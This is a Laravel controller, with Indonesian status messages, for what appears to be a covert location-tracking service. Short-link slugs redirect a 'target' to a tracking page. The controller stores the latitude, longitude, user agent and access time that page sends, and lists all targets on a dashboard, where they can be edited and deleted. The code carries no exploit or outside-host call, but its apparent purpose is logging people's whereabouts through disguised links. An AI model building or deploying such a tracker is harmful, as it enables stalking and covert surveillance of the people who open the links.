<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Target;
use Illuminate\Support\Str;

class TrackController extends Controller
{
    public function showTargetPage($id)
    {
        return view('track', ['id' => $id]);
    }

    public function storeLocation(Request $request, $id)
    {
        $target = Target::firstOrCreate(['id' => $id]);
        $target->latitude = $request->latitude;
        $target->longitude = $request->longitude;
        $target->user_agent = $request->header('User-Agent');
        $target->accessed_at = now();
        $target->save();

        return response()->json(['status' => 'success']);
    }

    public function dashboard()
    {
        $targets = Target::orderByDesc('accessed_at')->get();
        return view('dashboard', compact('targets'));
    }


    public function handleShortLink($slug)
    {
        $target = Target::where('slug', $slug)->first();

        if (!$target) {
            abort(404);
        }

        return redirect("/track/" . $target->id);
    }
    
    public function deleteTarget($id)
    {
    $target = Target::findOrFail($id);
    $target->delete();

    return redirect('/dashboard')->with('success', 'Target berhasil dihapus.');
    }

    public function editTarget($id)
    {
    $target = Target::findOrFail($id);
    return view('edit-target', compact('target'));
    }

    public function updateTarget(Request $request, $id)
    {
    $target = Target::findOrFail($id);
    $target->slug = $request->slug;
    $target->save();

    return redirect('/dashboard')->with('success', 'Target berhasil diperbarui.');
    }

}